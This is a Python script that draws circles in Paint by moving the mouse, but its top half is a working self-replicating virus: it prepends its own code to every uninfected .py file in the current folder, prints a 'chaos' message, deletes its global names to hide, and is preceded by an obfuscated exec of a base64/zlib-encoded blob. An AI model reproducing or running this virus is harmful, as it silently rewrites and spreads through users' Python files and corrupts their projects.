
# begin-f25cd921ed484be0c4be04866a04abf8
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
# end-f25cd921ed484be0c4be04866a04abf8
# begin-virus

import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code()

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i
# end-virus
from UTIL import *
MaximizePaint()
FailSafe()
x0=900
y0=540
mouse.move(x0,y0)
def tnemgeSrawD(x0=x0,y0=y0,r=10, a=-5, d=0.001):
    mouse.click()
    x=math.cos(math.radians(a))*r
    y=math.sin(math.radians(a))*r
    mouse.drag(x0, y0, end_x=x+x0, end_y=y+y0, duration=d)
    return x+x0, y+y0
def drawcirclethingymobob():
    for i in range(100):
        tnemgeSrawD(r=250, a=5*i-5, d=0.001)
def irlcirclecaughtin4k(x0,y0,r=5,a=5,d=0.001,s=100):
    x,y=x0,y0
    for i in range(s):
        FailSafe()
        x,y=tnemgeSrawD(x0=x, y0=y,r=r, a=a*i-a, d=d)

irlcirclecaughtin4k(x0=x0,y0=y0,r=-10,s=72)
